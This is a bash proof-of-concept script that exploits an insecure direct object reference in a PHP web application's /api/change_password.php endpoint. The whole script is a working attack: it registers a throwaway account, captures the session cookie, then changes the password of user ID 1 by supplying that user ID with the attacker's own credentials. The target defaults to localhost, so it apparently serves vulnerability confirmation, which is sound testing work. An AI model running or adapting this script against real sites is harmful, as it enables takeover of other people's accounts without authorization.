#!/bin/bash

# IDOR Vulnerability POC - /api/change_password.php
# Demonstrates Insecure Direct Object Reference allowing account takeover
# Objective: Change arbitrary user passwords without authorization

TARGET="${1:-http://localhost:8080}"

echo "[*] IDOR Account Takeover POC"
echo "[*] Target: $TARGET/api/change_password.php"
echo ""

# Step 1: Create attacker account
echo "[1] Creating attacker account..."
ATTACKER_USER="idor_test_$(date +%s)"
ATTACKER_PASS="Attacker123"

REG=$(curl -s -X POST "$TARGET/api/register.php" \
  -d "username=$ATTACKER_USER&email=test@test.com&password=$ATTACKER_PASS")

if ! echo "$REG" | grep -q "Registration successful"; then
  echo "[-] Registration failed"
  exit 1
fi

echo "[+] Account created: $ATTACKER_USER"

# Step 2: Login to get session
echo "[2] Authenticating..."
curl -s -X POST "$TARGET/api/login.php" \
  -d "username=$ATTACKER_USER&password=$ATTACKER_PASS" \
  -c /tmp/attacker_session.txt > /dev/null

COOKIE=$(grep PHPSESSID /tmp/attacker_session.txt | tail -1 | awk '{print $NF}')

if [ -z "$COOKIE" ]; then
  echo "[-] Login failed"
  exit 1
fi

echo "[+] Session obtained: $COOKIE"

# Step 3: Exploit IDOR - Change user ID 1's password
echo "[3] Exploiting IDOR to change user ID 1 password..."

EXPLOIT=$(curl -s -X POST "$TARGET/api/change_password.php" \
  --cookie "PHPSESSID=$COOKIE" \
  -d "userId=1&oldPassword=$ATTACKER_PASS&newPassword=POCSuccess123&confirmPassword=POCSuccess123")

if echo "$EXPLOIT" | grep -q "Password changed successfully"; then
  echo "[+] IDOR EXPLOITED: Successfully changed user ID 1 password"
  echo "[+] Vulnerability confirmed: Can change arbitrary user passwords"
  exit 0
else
  echo "[-] Exploitation failed: $EXPLOIT"
  exit 1
fi
